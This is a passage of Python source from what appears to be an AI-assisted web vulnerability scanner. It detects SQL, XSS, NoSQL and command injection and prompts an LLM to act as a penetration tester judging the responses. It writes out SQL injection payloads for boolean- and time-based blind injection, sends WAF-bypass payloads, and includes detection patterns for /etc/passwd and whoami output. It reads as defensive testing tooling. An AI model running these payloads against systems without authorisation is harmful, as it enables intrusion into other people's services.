                self._progress.confirmed_findings += 1
            else:
                self._progress.potential_findings += 1
            self._progress.total_findings += 1

        # Add to state manager
        vuln_data = {
            "url": result.request_url,
            "method": result.request_method,
            "category": result.category.value if isinstance(result.category, ScanCategory) else result.category,
            "severity": result.severity.value if isinstance(result.severity, Severity) else result.severity,
            "confidence": result.confidence.value if isinstance(result.confidence, Confidence) else result.confidence,
            "title": f"{result.category.value.upper() if isinstance(result.category, ScanCategory) else result.category} in {result.parameter}",
            "description": result.evidence,
            "payload": result.payload,
            "parameter": result.parameter,
            "poc": result.poc,
            "response_status": result.response_status,
            "response_snippet": result.response_body[:500] if result.response_body else "",
            "ai_analysis": result.ai_analysis or "",
            "confirmed": result.confidence in (Confidence.CONFIRMED, Confidence.HIGH),
        }

        self.state.add_finding(vuln_data)

        logger.info(
            "FINDING: [%s] %s | endpoint=%s | param=%s | confidence=%s | severity=%s",
            result.category.value if isinstance(result.category, ScanCategory) else result.category,
            "CONFIRMED" if result.is_vulnerable else "POTENTIAL",
            result.request_url,
            result.parameter,
            result.confidence.value if isinstance(result.confidence, Confidence) else result.confidence,
            result.severity.value if isinstance(result.severity, Severity) else result.severity,
        )

    def _update_progress(self, category: Optional[ScanCategory] = None, endpoint: str = "", tests_done: int = 1) -> None:
        """Update scan progress counters."""
        self._progress.completed_tests += tests_done
        if category:
            self._progress.current_category = category.value
        if endpoint:
            self._progress.current_endpoint = endpoint

    def _mark_category_complete(self, category: ScanCategory) -> None:
        """Mark an entire scan category as completed."""
        cat_val = category.value
        if cat_val not in self._progress.categories_completed:
            self._progress.categories_completed.append(cat_val)
        if cat_val in self._progress.categories_remaining:
            self._progress.categories_remaining.remove(cat_val)

    def get_progress(self) -> Dict[str, Any]:
        """Return current scan progress."""
        return self._progress.to_dict()

    def get_findings(self) -> List[Dict[str, Any]]:
        """Return all findings as dicts."""
        return [f.to_dict() for f in self._findings if f.is_vulnerable]

    def get_all_results(self) -> List[Dict[str, Any]]:
        """Return all test results (including non-vulnerable)."""
        return [r.to_dict() for r in self._all_results]

    def cancel_scan(self) -> None:
        """Request scan cancellation."""
        self._cancelled = True
        logger.warning("Scan cancellation requested")

    def is_running(self) -> bool:
        """Check if scanner is currently running."""
        return self._running
    
        # =================================================================
    # RESPONSE ANALYSIS — PROGRAMMATIC (FAST) CHECKS
    # =================================================================

    def _check_sqli_programmatic(
        self,
        response: SmartResponse,
        baseline: BaselineResponse,
        payload: str,
    ) -> Tuple[bool, Confidence, str]:
        """
        Fast programmatic check for SQL injection indicators.
        Returns (is_vulnerable, confidence, evidence).
        """
        evidence_parts: List[str] = []
        confidence = Confidence.TENTATIVE
        is_vuln = False

        body = response.text.lower() if response.text else ""

        # 1. Check SmartResponse built-in SQLi detection
        if response.has_sqli_indicators():
            details = response.get_sqli_details()
            evidence_parts.append(f"SQLi indicators detected: {'; '.join(details[:3])}")
            is_vuln = True
            confidence = Confidence.HIGH

        # 2. Check for SQL error patterns in response body
        for pattern in SQL_ERROR_PATTERNS:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                evidence_parts.append(f"SQL error pattern matched: '{match.group(0)}'")
                is_vuln = True
                confidence = Confidence.CONFIRMED
                break

        # 3. Status code anomaly: normal → 500
        if baseline.captured and baseline.status_code in (200, 201, 204, 301, 302):
            if response.status_code == 500:
                evidence_parts.append(
                    f"Status code changed from {baseline.status_code} to {response.status_code} (server error on injection)"
                )
                if not is_vuln:
                    is_vuln = True
                    confidence = Confidence.MEDIUM

        # 4. Response size anomaly — significantly larger may mean data leak
        if baseline.captured and baseline.content_length > 0:
            size_diff = abs(response.content_length - baseline.content_length)
            ratio = size_diff / baseline.content_length if baseline.content_length else 0
            if ratio > MIN_SIZE_DIFF_RATIO and response.content_length > baseline.content_length:
                evidence_parts.append(
                    f"Response size increased significantly: {baseline.content_length} → {response.content_length} "
                    f"(+{size_diff} bytes, {ratio:.0%} increase)"
                )
                if not is_vuln:
                    is_vuln = True
                    confidence = Confidence.MEDIUM

        # 5. Time-based detection
        if baseline.captured and baseline.response_time > 0:
            time_diff = response.response_time - baseline.response_time
            if time_diff >= TIME_BASED_THRESHOLD:
                evidence_parts.append(
                    f"Time-based delay detected: baseline={baseline.response_time:.2f}s, "
                    f"with payload={response.response_time:.2f}s (delta={time_diff:.2f}s)"
                )
                is_vuln = True
                confidence = Confidence.HIGH

        # 6. Boolean-based: check if response differs for true vs false conditions
        # (this is detected at the caller level by sending pairs)

        # 7. UNION-based: check if extra columns appeared in response
        if "union" in payload.lower() and response.is_json:
            try:
                data = response.json_data
                if isinstance(data, dict):
                    # Check for unexpected keys or longer arrays
                    if data.get("data") and isinstance(data["data"], list):
                        if baseline.captured and baseline.content_length > 0:
                            if response.content_length > baseline.content_length * 1.5:
                                evidence_parts.append("UNION query may have returned extra data")
                                is_vuln = True
                                confidence = Confidence.HIGH
                elif isinstance(data, list) and len(data) > 0:
                    evidence_parts.append(f"UNION query returned {len(data)} results")
                    if not is_vuln:
                        is_vuln = True
                        confidence = Confidence.MEDIUM
            except Exception:
                pass

        # 8. Check for database-specific keywords in response
        db_keywords = [
            "sqlite_version", "mysql", "postgresql", "mssql",
            "information_schema", "table_name", "column_name",
            "sql_mode", "version()", "@@version", "pg_catalog",
        ]
        for kw in db_keywords:
            if kw in body:
                evidence_parts.append(f"Database keyword found in response: '{kw}'")
                is_vuln = True
                confidence = Confidence.CONFIRMED
                break

        evidence = " | ".join(evidence_parts) if evidence_parts else ""
        return is_vuln, confidence, evidence

    def _check_xss_programmatic(
        self,
        response: SmartResponse,
        baseline: BaselineResponse,
        payload: str,
    ) -> Tuple[bool, Confidence, str]:
        """
        Fast programmatic check for XSS indicators.
        Returns (is_vulnerable, confidence, evidence).
        """
        evidence_parts: List[str] = []
        confidence = Confidence.TENTATIVE
        is_vuln = False

        body = response.text if response.text else ""

        # 1. Check SmartResponse built-in XSS reflection check
        if response.has_xss_reflection(payload):
            reflection_ctx = response.has_xss_reflection_context(payload)
            evidence_parts.append(f"Payload reflected in response unencoded")
            if reflection_ctx.get("in_html_body"):
                evidence_parts.append("Reflection found in HTML body")
                is_vuln = True
                confidence = Confidence.CONFIRMED
            elif reflection_ctx.get("in_attribute"):
                evidence_parts.append("Reflection found in HTML attribute")
                is_vuln = True
                confidence = Confidence.CONFIRMED
            elif reflection_ctx.get("in_script"):
                evidence_parts.append("Reflection found inside <script> tag")
                is_vuln = True
                confidence = Confidence.CONFIRMED
            elif reflection_ctx.get("in_event_handler"):
                evidence_parts.append("Reflection found in event handler")
                is_vuln = True
                confidence = Confidence.CONFIRMED
            else:
                evidence_parts.append("Payload reflected but context unclear")
                is_vuln = True
                confidence = Confidence.HIGH

        # 2. Check if specific dangerous constructs are reflected
        dangerous_patterns = [
            (r"<script[^>]*>.*?</script>", "Script tag reflected"),
            (r"on\w+\s*=\s*[\"']?[^\"']*[\"']?", "Event handler reflected"),
            (r"javascript\s*:", "JavaScript protocol reflected"),
            (r"<img[^>]+onerror\s*=", "IMG onerror reflected"),
            (r"<svg[^>]+onload\s*=", "SVG onload reflected"),
            (r"<iframe[^>]+src\s*=", "IFRAME src reflected"),
        ]

        # Only check if the payload contains relevant constructs
        payload_lower = payload.lower()
        for pattern, desc in dangerous_patterns:
            if re.search(pattern, body, re.IGNORECASE | re.DOTALL):
                # Verify it's our payload and not just existing page content
                # by checking if it wasn't in the baseline
                if baseline.captured and baseline.body_preview:
                    if not re.search(pattern, baseline.body_preview, re.IGNORECASE | re.DOTALL):
                        evidence_parts.append(desc)
                        is_vuln = True
                        confidence = Confidence.CONFIRMED
                        break
                else:
                    # No baseline to compare, check if payload substring is in response
                    # Strip HTML tags from payload to get the core
                    core_parts = re.findall(r"alert\([^)]*\)|prompt\([^)]*\)|confirm\([^)]*\)", payload_lower)
                    for core in core_parts:
                        if core in body.lower():
                            evidence_parts.append(f"{desc} — core payload '{core}' found")
                            is_vuln = True
                            confidence = Confidence.HIGH
                            break

        # 3. Check for DOM-based XSS indicators
        dom_sinks = [
            "document.write(", "document.writeln(",
            "innerHTML", "outerHTML",
            "eval(", "setTimeout(", "setInterval(",
            ".src=", ".href=", ".action=",
            "location.hash", "location.search",
            "document.URL", "document.documentURI",
        ]
        for sink in dom_sinks:
            if sink.lower() in body.lower():
                # Check if our payload value ends up near a sink
                payload_stripped = re.sub(r"[<>\"'/\\]", "", payload)
                if payload_stripped and payload_stripped.lower() in body.lower():
                    evidence_parts.append(f"DOM sink '{sink}' found with payload value nearby")
                    if not is_vuln:
                        is_vuln = True
                        confidence = Confidence.MEDIUM

        # 4. JSON response — check if payload is reflected unencoded
        if response.is_json and response.json_data:
            json_str = json.dumps(response.json_data)
            if payload in json_str:
                evidence_parts.append("Payload reflected in JSON response without encoding")
                is_vuln = True
                confidence = Confidence.HIGH

        # 5. Check response headers for reflected payload
        if response.headers:
            for header_name, header_value in response.headers.items():
                if payload in str(header_value):
                    evidence_parts.append(f"Payload reflected in response header: {header_name}")
                    is_vuln = True
                    confidence = Confidence.HIGH
                    break

        evidence = " | ".join(evidence_parts) if evidence_parts else ""
        return is_vuln, confidence, evidence

    def _check_nosql_programmatic(
        self,
        response: SmartResponse,
        baseline: BaselineResponse,
        payload: str,
    ) -> Tuple[bool, Confidence, str]:
        """
        Fast programmatic check for NoSQL injection indicators.
        Returns (is_vulnerable, confidence, evidence).
        """
        evidence_parts: List[str] = []
        confidence = Confidence.TENTATIVE
        is_vuln = False

        body = response.text.lower() if response.text else ""

        # 1. MongoDB error patterns
        nosql_errors = [
            r"mongoerror",
            r"mongo\..*error",
            r"bson",
            r"unterminated string in json",
            r"objectid",
            r"invalid operator",
            r"\$where",
            r"cannot apply.*to.*field",
            r"cast.*objectid.*failed",
            r"projection.*cannot",
            r"aggregation.*error",
            r"cursor.*error",
            r"topology.*destroyed",
        ]
        for pattern in nosql_errors:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                evidence_parts.append(f"NoSQL error pattern: '{match.group(0)}'")
                is_vuln = True
                confidence = Confidence.CONFIRMED
                break

        # 2. Authentication bypass — got 200 when baseline was 401/403
        if baseline.captured:
            if baseline.status_code in (401, 403) and response.status_code == 200:
                evidence_parts.append(
                    f"Auth bypass: status changed {baseline.status_code} → {response.status_code}"
                )
                is_vuln = True
                confidence = Confidence.HIGH

        # 3. Data leak — response significantly larger
        if baseline.captured and baseline.content_length > 0:
            if response.content_length > baseline.content_length * 2:
                evidence_parts.append(
                    f"Possible data leak: response size {baseline.content_length} → {response.content_length}"
                )
                if not is_vuln:
                    is_vuln = True
                    confidence = Confidence.MEDIUM

        # 4. Check if more results returned than expected
        if response.is_json and response.json_data:
            data = response.json_data
            if isinstance(data, list) and len(data) > 1:
                evidence_parts.append(f"NoSQL injection returned {len(data)} results (possible $ne/$gt bypass)")
                if not is_vuln:
                    is_vuln = True
                    confidence = Confidence.MEDIUM
            elif isinstance(data, dict):
                if data.get("data") and isinstance(data["data"], list) and len(data["data"]) > 1:
                    evidence_parts.append(f"NoSQL injection returned {len(data['data'])} results")
                    if not is_vuln:
                        is_vuln = True
                        confidence = Confidence.MEDIUM

        evidence = " | ".join(evidence_parts) if evidence_parts else ""
        return is_vuln, confidence, evidence

    def _check_cmdi_programmatic(
        self,
        response: SmartResponse,
        baseline: BaselineResponse,
        payload: str,
    ) -> Tuple[bool, Confidence, str]:
        """
        Fast programmatic check for command injection indicators.
        Returns (is_vulnerable, confidence, evidence).
        """
        evidence_parts: List[str] = []
        confidence = Confidence.TENTATIVE
        is_vuln = False

        body = response.text if response.text else ""
        body_lower = body.lower()

        # 1. Check for command output indicators
        for indicator in CMD_INJECTION_INDICATORS:
            if indicator.lower() in body_lower:
                # Verify it's not in the baseline
                if baseline.captured and baseline.body_preview:
                    if indicator.lower() not in baseline.body_preview.lower():
                        evidence_parts.append(f"Command output indicator found: '{indicator}'")
                        is_vuln = True
                        confidence = Confidence.CONFIRMED
                        break
                else:
                    evidence_parts.append(f"Command output indicator found: '{indicator}'")
                    is_vuln = True
                    confidence = Confidence.HIGH
                    break

        # 2. Check for /etc/passwd format
        passwd_pattern = r"[a-zA-Z0-9_-]+:[x*!]:(\d+):(\d+):"
        if re.search(passwd_pattern, body):
            if not baseline.captured or not re.search(passwd_pattern, baseline.body_preview or ""):
                evidence_parts.append("Unix /etc/passwd format detected in response")
                is_vuln = True
                confidence = Confidence.CONFIRMED

        # 3. Time-based detection (for sleep/ping payloads)
        if baseline.captured and baseline.response_time > 0:
            time_diff = response.response_time - baseline.response_time
            if time_diff >= TIME_BASED_THRESHOLD:
                if any(cmd in payload.lower() for cmd in ["sleep", "ping", "timeout"]):
                    evidence_parts.append(
                        f"Time-based command injection: baseline={baseline.response_time:.2f}s, "
                        f"payload={response.response_time:.2f}s (delta={time_diff:.2f}s)"
                    )
                    is_vuln = True
                    confidence = Confidence.HIGH

        # 4. Check for whoami/id output
        whoami_patterns = [
            r"\broot\b",
            r"\bwww-data\b",
            r"\bnobody\b",
            r"\bapache\b",
            r"\bnginx\b",
            r"\bnode\b",
            r"uid=\d+",
            r"gid=\d+",
        ]
        for pattern in whoami_patterns:
            match = re.search(pattern, body)
            if match:
                if not baseline.captured or match.group(0) not in (baseline.body_preview or ""):
                    evidence_parts.append(f"Command output pattern: '{match.group(0)}'")
                    if not is_vuln:
                        is_vuln = True
                        confidence = Confidence.HIGH
                    break

        # 5. Status code change to 500
        if baseline.captured and baseline.status_code == 200 and response.status_code == 500:
            if any(sep in payload for sep in [";", "|", "`", "$("]):
                evidence_parts.append("Server error on command separator injection")
                if not is_vuln:
                    is_vuln = True
                    confidence = Confidence.LOW

        evidence = " | ".join(evidence_parts) if evidence_parts else ""
        return is_vuln, confidence, evidence

    # =================================================================
    # AI-POWERED RESPONSE ANALYSIS
    # =================================================================

    async def _ai_analyze_response(
        self,
        category: ScanCategory,
        target: ScanTarget,
        parameter: str,
        payload: str,
        response: SmartResponse,
        baseline: BaselineResponse,
        programmatic_evidence: str = "",
    ) -> Tuple[bool, Confidence, str]:
        """
        Use LLM to deeply analyse a request/response pair.
        Only called when programmatic checks are ambiguous
        or when we want to confirm a finding.

        Returns (is_vulnerable, confidence, ai_analysis_text).
        """
        if not self.use_ai:
            return False, Confidence.TENTATIVE, ""

        # Truncate response body for LLM
        resp_body = response.text[:MAX_RESPONSE_FOR_LLM] if response.text else "(empty)"

        # Build baseline info
        baseline_info = ""
        if baseline.captured:
            baseline_info = (
                f"Baseline (normal request): status={baseline.status_code}, "
                f"size={baseline.content_length} bytes, time={baseline.response_time:.2f}s"
            )

        # Category-specific analysis instructions
        category_instructions = {
            ScanCategory.SQLI: (
                "Look for: SQL error messages, database schema information, "
                "unexpected data in response, status code changes from 200 to 500, "
                "significantly larger response (data leak), time delays > 5 seconds. "
                "Check for: MySQL, PostgreSQL, SQLite, MSSQL, Oracle error patterns."
            ),
            ScanCategory.XSS: (
                "Look for: payload reflected without HTML encoding in the response body, "
                "payload inside HTML attributes without proper escaping, "
                "payload inside <script> tags, event handlers (onload, onerror, etc.) "
                "containing the payload. Check if dangerous characters < > \" ' are unescaped."
            ),
            ScanCategory.NOSQL: (
                "Look for: MongoDB error messages, authentication bypass (200 instead of 401), "
                "more data returned than expected, BSON errors, operator errors. "
                "Check if $gt, $ne, $regex operators were processed by the server."
            ),
            ScanCategory.CMD_INJECTION: (
                "Look for: Unix/Linux command output (uid=, gid=, /etc/passwd content), "
                "Windows command output (dir, systeminfo), command errors, "
                "time delays indicating sleep/ping execution. "
                "Check if command separators (;, |, &&, ``) were processed."
            ),
        }

        instructions = category_instructions.get(
            category,
            "Analyse the response carefully for any signs of vulnerability."
        )

        prompt = f"""You are an expert penetration tester analysing an HTTP response for vulnerabilities.

VULNERABILITY TYPE: {category.value.upper()}
TARGET URL: {target.url}
HTTP METHOD: {target.method}
PARAMETER TESTED: {parameter}
PAYLOAD SENT: {payload}
{baseline_info}

REQUEST → Response:
- Status Code: {response.status_code}
- Response Size: {response.content_length} bytes
- Response Time: {response.response_time:.2f}s
- Content-Type: {response.headers.get('content-type', 'unknown') if response.headers else 'unknown'}

RESPONSE BODY (truncated):
{resp_body}

PROGRAMMATIC ANALYSIS (already done):
{programmatic_evidence if programmatic_evidence else "No clear indicators found programmatically."}

ANALYSIS INSTRUCTIONS:
{instructions}

Based on the above, determine:
1. Is this endpoint VULNERABLE to {category.value.upper()}? (yes/no/maybe)
2. Confidence level: confirmed, high, medium, low, tentative
3. What specific evidence supports your conclusion?
4. If vulnerable, what is the security impact?

Respond in this exact JSON format:
{{"vulnerable": true/false, "confidence": "confirmed/high/medium/low/tentative", "evidence": "specific evidence here", "impact": "impact description"}}
"""

        try:
            llm_response = await self.llm.query(prompt, task="analysis")

            if not llm_response or not llm_response.content:
                return False, Confidence.TENTATIVE, "LLM returned empty response"

            response_text = llm_response.content.strip()

            # Try to parse JSON from response
            json_match = re.search(r"\{[^{}]*\}", response_text, re.DOTALL)
            if json_match:
                try:
                    result = json.loads(json_match.group(0))
                    is_vuln = result.get("vulnerable", False)
                    conf_str = result.get("confidence", "tentative").lower()
                    evidence = result.get("evidence", "")
                    impact = result.get("impact", "")

                    confidence_map = {
                        "confirmed": Confidence.CONFIRMED,
                        "high": Confidence.HIGH,
                        "medium": Confidence.MEDIUM,
                        "low": Confidence.LOW,
                        "tentative": Confidence.TENTATIVE,
                    }
                    conf = confidence_map.get(conf_str, Confidence.TENTATIVE)

                    analysis = f"AI Analysis: {evidence}"
                    if impact:
                        analysis += f" | Impact: {impact}"

                    return bool(is_vuln), conf, analysis

                except json.JSONDecodeError:
                    pass

            # Fallback: parse text response
            is_vuln = any(word in response_text.lower() for word in ["vulnerable: yes", "\"vulnerable\": true", "is vulnerable", "confirmed vulnerable"])
            analysis = f"AI Analysis: {response_text[:500]}"
            conf = Confidence.MEDIUM if is_vuln else Confidence.TENTATIVE

            return is_vuln, conf, analysis

        except Exception as exc:
            logger.warning("AI analysis failed: %s", str(exc))
            return False, Confidence.TENTATIVE, f"AI analysis error: {str(exc)}"

    # =================================================================
    # SQL INJECTION SCANNER
    # =================================================================

    async def _scan_sqli(self, target: ScanTarget) -> List[TestResult]:
        """
        Test a single endpoint for SQL injection vulnerabilities.
        Covers: error-based, UNION-based, boolean-based, time-based.
        """
        results: List[TestResult] = []
        category = ScanCategory.SQLI
        baseline = self._get_baseline(target)
        parameters = self._get_all_parameters(target)

        if not parameters:
            logger.debug("SQLi: No parameters to test for %s", target.url)
            return results

        for param_name, (param_value, param_location) in parameters.items():
            if self._cancelled:
                break

            if self._is_tested(target.url, category, param_name):
                continue

            context = self._build_payload_context(target, param_name)
            payloads_raw = self.payloads.get_payloads("sqli", context)

            # If WAF detected, also get WAF bypass payloads
            if self._waf_detected:
                waf_payloads = self.payloads.get_waf_bypass_payloads("sqli")
                payloads_raw.extend(waf_payloads)

            # Limit payloads
            payloads_to_test = payloads_raw[:self.max_payloads]

            logger.info(
                "SQLi: Testing %s param='%s' with %d payloads",
                target.url, param_name, len(payloads_to_test),
            )

            found_vuln = False

            for payload_dict in payloads_to_test:
                if self._cancelled:
                    break
                if found_vuln and not self.aggressive:
                    break

                payload_str = payload_dict.get("payload", "") if isinstance(payload_dict, dict) else str(payload_dict)
                if not payload_str:
                    continue

                payload_hash = hashlib.md5(payload_str.encode()).hexdigest()[:8]
                if self._is_tested(target.url, category, param_name, payload_hash):
                    continue

                # Send the payload
                start_time = time.time()
                resp = await self._send_payload(target, param_name, param_location, payload_str, param_value)
                elapsed = time.time() - start_time

                self._mark_tested(target.url, category, param_name, payload_hash)
                self._update_progress(category, target.url)

                if not resp:
                    continue

                # Build test result
                result = TestResult(
                    target=target,
                    category=category,
                    payload=payload_str,
                    parameter=param_name,
                    request_url=target.url,
                    request_method=target.method,
                    request_body=target.body,
                    response_status=resp.status_code,
                    response_body=resp.text[:2000] if resp.text else "",
                    response_headers=dict(resp.headers) if resp.headers else None,
                    response_time=resp.response_time,
                    response_size=resp.content_length,
                    baseline_status=baseline.status_code,
                    baseline_size=baseline.content_length,
                    baseline_time=baseline.response_time,
                )

                # Programmatic check
                is_vuln, confidence, evidence = self._check_sqli_programmatic(resp, baseline, payload_str)

                if is_vuln:
                    result.is_vulnerable = True
                    result.confidence = confidence
                    result.evidence = evidence

                    # Determine severity
                    if confidence in (Confidence.CONFIRMED, Confidence.HIGH):
                        result.severity = Severity.CRITICAL
                    else:
                        result.severity = Severity.HIGH

                    # Generate PoC
                    result.poc = self._generate_poc(target, category, param_name, param_location, payload_str, resp)

                    # AI confirmation for high-confidence findings
                    if self.use_ai and confidence in (Confidence.CONFIRMED, Confidence.HIGH):
                        ai_vuln, ai_conf, ai_text = await self._ai_analyze_response(
                            category, target, param_name, payload_str, resp, baseline, evidence,
                        )
                        result.ai_analysis = ai_text
                        if ai_vuln and ai_conf in (Confidence.CONFIRMED, Confidence.HIGH):
                            result.confidence = Confidence.CONFIRMED

                    self._record_finding(result)
                    found_vuln = True

                elif self.use_ai and not is_vuln:
                    # Check for subtle indicators that need AI analysis
                    needs_ai = False

                    # Status code change
                    if baseline.captured and resp.status_code != baseline.status_code:
                        needs_ai = True

                    # Response size significantly different
                    if baseline.captured and baseline.content_length > 0:
                        ratio = abs(resp.content_length - baseline.content_length) / baseline.content_length
                        if ratio > 0.2:
                            needs_ai = True

                    # Response time significantly different
                    if baseline.captured and resp.response_time > baseline.response_time + 2:
                        needs_ai = True

                    if needs_ai:
                        ai_vuln, ai_conf, ai_text = await self._ai_analyze_response(
                            category, target, param_name, payload_str, resp, baseline,
                        )
                        result.ai_analysis = ai_text
                        if ai_vuln:
                            result.is_vulnerable = True
                            result.confidence = ai_conf
                            result.evidence = ai_text
                            result.severity = Severity.HIGH if ai_conf in (Confidence.CONFIRMED, Confidence.HIGH) else Severity.MEDIUM
                            result.poc = self._generate_poc(target, category, param_name, param_location, payload_str, resp)
                            self._record_finding(result)
                            found_vuln = True

                self._all_results.append(result)

            # === Boolean-based blind SQLi test ===
            if not found_vuln and not self._cancelled:
                bool_result = await self._test_boolean_blind_sqli(target, param_name, param_location, param_value, baseline)
                if bool_result and bool_result.is_vulnerable:
                    results.append(bool_result)
                    self._record_finding(bool_result)
                    found_vuln = True

            # === Time-based blind SQLi test ===
            if not found_vuln and not self._cancelled:
                time_result = await self._test_time_blind_sqli(target, param_name, param_location, param_value, baseline)
                if time_result and time_result.is_vulnerable:
                    results.append(time_result)
                    self._record_finding(time_result)
                    found_vuln = True

            # Mark parameter as tested
            self.state.mark_endpoint_tested(target.url, category.value, {
                "parameter": param_name,
                "payloads_tested": len(payloads_to_test),
                "vulnerable": found_vuln,
            })

        return results

    async def _test_boolean_blind_sqli(
        self,
        target: ScanTarget,
        param_name: str,
        param_location: str,
        original_value: str,
        baseline: BaselineResponse,
    ) -> Optional[TestResult]:
        """
        Test for boolean-based blind SQL injection by sending
        true and false conditions and comparing responses.
        """
        true_payloads = [
            f"{original_value}' OR '1'='1",
            f"{original_value}' OR 1=1--",
            f"{original_value} OR 1=1--",
            f"{original_value}' OR 'a'='a",
            f"{original_value}\" OR \"1\"=\"1",
        ]
        false_payloads = [
            f"{original_value}' OR '1'='2",
            f"{original_value}' OR 1=2--",
            f"{original_value} OR 1=2--",
            f"{original_value}' OR 'a'='b",
            f"{original_value}\" OR \"1\"=\"2",
        ]

        for true_payload, false_payload in zip(true_payloads, false_payloads):
            if self._cancelled:
                break

            true_resp = await self._send_payload(target, param_name, param_location, true_payload, original_value)
            false_resp = await self._send_payload(target, param_name, param_location, false_payload, original_value)

            self._update_progress(ScanCategory.SQLI, target.url, 2)

            if not true_resp or not false_resp:
                continue

            # Compare responses
            true_hash = hashlib.md5(true_resp.text.encode("utf-8", errors="replace")).hexdigest() if true_resp.text else ""
            false_hash = hashlib.md5(false_resp.text.encode("utf-8", errors="replace")).hexdigest() if false_resp.text else ""

            # Different responses for true vs false = boolean blind SQLi
            responses_differ = False
            evidence_parts: List[str] = []

            if true_hash != false_hash:
                responses_differ = True
                evidence_parts.append("Response body differs between TRUE and FALSE conditions")

            if true_resp.status_code != false_resp.status_code:
                responses_differ = True
                evidence_parts.append(
                    f"Status code differs: TRUE={true_resp.status_code}, FALSE={false_resp.status_code}"
                )

            if abs(true_resp.content_length - false_resp.content_length) > 50:
                responses_differ = True
                evidence_parts.append(
                    f"Response size differs: TRUE={true_resp.content_length}, FALSE={false_resp.content_length}"
                )

            if responses_differ:
                # Verify it's not just random variation by sending true condition again
                verify_resp = await self._send_payload(target, param_name, param_location, true_payload, original_value)
                self._update_progress(ScanCategory.SQLI, target.url)

                if verify_resp:
                    verify_hash = hashlib.md5(verify_resp.text.encode("utf-8", errors="replace")).hexdigest() if verify_resp.text else ""

                    # If verify matches true (consistent), it's likely boolean blind
                    if verify_hash == true_hash or abs(verify_resp.content_length - true_resp.content_length) < 20:
                        evidence = " | ".join(evidence_parts)
                        evidence += " | Verified: TRUE condition produces consistent results"

                        result = TestResult(
                            target=target,
                            category=ScanCategory.SQLI,
                            payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                            parameter=param_name,
                            request_url=target.url,
                            request_method=target.method,
                            response_status=true_resp.status_code,
                            response_body=true_resp.text[:1000] if true_resp.text else "",
                            response_time=true_resp.response_time,
                            response_size=true_resp.content_length,
                            baseline_status=baseline.status_code,
                            baseline_size=baseline.content_length,
                            is_vulnerable=True,
                            confidence=Confidence.HIGH,
                            severity=Severity.CRITICAL,
                            evidence=evidence,
                        )
                        result.poc = self._generate_poc(
                            target, ScanCategory.SQLI, param_name, param_location, true_payload, true_resp,
                        )
                        result.poc += f"\n\n# Boolean Blind SQLi\n# TRUE condition: {true_payload}\n# FALSE condition: {false_payload}"

                        self._all_results.append(result)
                        return result

        return None

    async def _test_time_blind_sqli(
        self,
        target: ScanTarget,
        param_name: str,
        param_location: str,
        original_value: str,
        baseline: BaselineResponse,
    ) -> Optional[TestResult]:
        """
        Test for time-based blind SQL injection by sending
        sleep/waitfor payloads and measuring response time.
        """
        time_payloads = [
            (f"{original_value}' OR SLEEP(5)--", "mysql"),
            (f"{original_value}'; WAITFOR DELAY '0:0:5'--", "mssql"),
            (f"{original_value}' || pg_sleep(5)--", "postgresql"),
            (f"{original_value}' AND (SELECT CASE WHEN (1=1) THEN RANDOMBLOB(500000000) ELSE 1 END)--", "sqlite"),
            (f"1' AND SLEEP(5)--", "mysql"),
            (f"1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", "postgresql"),
        ]

        baseline_time = baseline.response_time if baseline.captured else 1.0

        for payload_str, db_type in time_payloads:
            if self._cancelled:
                break

            start = time.time()
            resp = await self._send_payload(target, param_name, param_location, payload_str, original_value)
            elapsed = time.time() - start

            self._update_progress(ScanCategory.SQLI, target.url)

            if not resp:
                # Timeout might itself be an indicator
                if elapsed >= TIME_BASED_THRESHOLD:
                    result = TestResult(
                        target=target,
                        category=ScanCategory.SQLI,
                        payload=payload_str,
                        parameter=param_name,
                        request_url=target.url,
                        request_method=target.method,
                        response_status=0,
                        response_time=elapsed,
                        baseline_time=baseline_time,
                        is_vulnerable=True,
                        confidence=Confidence.MEDIUM,
                        severity=Severity.CRITICAL,
                        evidence=f"Request timed out after {elapsed:.2f}s (baseline: {baseline_time:.2f}s) — possible time-based blind SQLi ({db_type})",
                    )
                    result.poc = self._generate_poc(
                        target, ScanCategory.SQLI, param_name,
                        self._get_all_parameters(target).get(param_name, ("", "query"))[1],
                        payload_str,
                    )
                    self._all_results.append(result)
                    return result
                continue

            time_diff = resp.response_time - baseline_time

            if time_diff >= TIME_BASED_THRESHOLD:
                # Verify with a second request
                verify_resp = await self._send_payload(target, param_name, param_location, payload_str, original_value)
                self._update_progress(ScanCategory.SQLI, target.url)

                verified = False
                if verify_resp and verify_resp.response_time - baseline_time >= TIME_BASED_THRESHOLD:
                    verified = True
                elif not verify_resp:
                    # Timeout again = likely time-based
                    verified = True

                if verified:
                    evidence = (
                        f"Time-based blind SQLi ({db_type}): "
                        f"baseline={baseline_time:.2f}s, payload response={resp.response_time:.2f}s "
                        f"(delta={time_diff:.2f}s), verified with second request"
                    )

                    result = TestResult(
                        target=target,
                        category=ScanCategory.SQLI,
                        payload=payload_str,
                        parameter=param_name,
                        request_url=target.url,
                        request_method=target.method,
                        response_status=resp.status_code,
                        response_body=resp.text[:500] if resp.text else "",
                        response_time=resp.response_time,
                        response_size=resp.content_length,
                        baseline_status=baseline.status_code,
                        baseline_size=baseline.content_length,
                        baseline_time=baseline_time,
                        is_vulnerable=True,
                        confidence=Confidence.CONFIRMED,
                        severity=Severity.CRITICAL,
                        evidence=evidence,
                    )
                    result.poc = self._generate_poc(
                        target, ScanCategory.SQLI, param_name,
                        self._get_all_parameters(target).get(param_name, ("", "query"))[1],
                        payload_str, resp,
                    )
                    result.poc += f"\n\n# Time-based Blind SQLi ({db_type})\n# Expected delay: ~5 seconds"

                    self._all_results.append(result)
                    return result

        return None

    # =================================================================
    # XSS SCANNER
    # =================================================================

    async def _scan_xss(self, target: ScanTarget) -> List[TestResult]:
        """
        Test a single endpoint for XSS vulnerabilities.
        Covers: reflected, stored, DOM-based.
        """
        results: List[TestResult] = []
        category = ScanCategory.XSS
        baseline = self._get_baseline(target)
        parameters = self._get_all_parameters(target)

        if not parameters:
            return results

        for param_name, (param_value, param_location) in parameters.items():
            if self._cancelled:
                break

            if self._is_tested(target.url, category, param_name):
                continue

            context = self._build_payload_context(target, param_name)
            payloads_raw = self.payloads.get_payloads("xss", context)

            if self._waf_detected:
                waf_payloads = self.payloads.get_waf_bypass_payloads("xss")
                payloads_raw.extend(waf_payloads)

            payloads_to_test = payloads_raw[:self.max_payloads]

            logger.info(
